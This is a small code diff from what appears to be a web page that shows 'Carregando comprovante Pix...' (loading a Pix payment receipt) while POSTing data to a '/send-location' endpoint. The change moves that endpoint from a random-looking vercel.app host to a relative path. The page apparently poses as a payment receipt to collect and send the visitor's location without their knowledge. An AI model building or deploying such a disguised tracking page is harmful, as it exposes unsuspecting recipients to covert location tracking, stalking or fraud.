@@ -26,7 +26,7 @@
 
       updateStatus("Carregando comprovante Pix...");
 
-      fetch("https://comprovante5675787231312231325678.vercel.app/send-location", {
+      fetch("/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
